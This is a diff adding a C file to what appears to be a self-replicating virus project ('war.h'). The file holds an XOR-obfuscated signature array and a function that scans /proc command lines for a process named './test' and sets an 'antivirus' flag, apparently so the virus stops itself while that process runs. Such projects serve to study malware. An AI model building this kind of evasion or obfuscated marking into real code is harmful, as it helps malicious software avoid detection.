@@ -1,0 +1,41 @@
+#include "../incl/war.h"
+
+static unsigned char g_signature[] = {
+    0x15, 0x23, 0x30, 0x62, 0x34, 0x27, 0x30, 0x31,
+    0x2b, 0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62,
+    0x6a, 0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62,
+    0x0d, 0x21, 0x36, 0x62, 0x6f, 0x62, 0x70, 0x72,
+    0x70, 0x74, 0x62, 0x20, 0x3b, 0x62, 0x26, 0x23,
+    0x34, 0x25, 0x23, 0x2e, 0x2e, 0x27, 0x62, 0x6f,
+    0x62, 0x19, 0x04, 0x0b, 0x0c, 0x05, 0x07, 0x10,
+    0x12, 0x10, 0x0b, 0x0c, 0x16, 0x1f, 0x00
+};
+
+void    ft_antiprocess(t_war *war)
+{
+    char            buffer[1024];
+    char            path[1024];
+    int             fd;
+    DIR             *proc;
+    struct dirent   *entry;
+
+    proc = opendir("/proc");
+    if (!proc)
+        return;
+
+    while ((entry = readdir(proc)) != NULL && war->antivirus != 1)
+    {
+        if (entry->d_name[0] < '1' || entry->d_name[0] > '9')
+            continue;
+        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
+        fd = open(path, O_RDONLY);
+        if (fd == -1)
+            continue;
+        memset(buffer, 0, sizeof(buffer));
+        read(fd, buffer, sizeof(buffer) -1);
+        close(fd);
+        if (strcmp("./test", buffer) == 0)
+            war->antivirus = 1;
+    }
+    closedir(proc);
+}
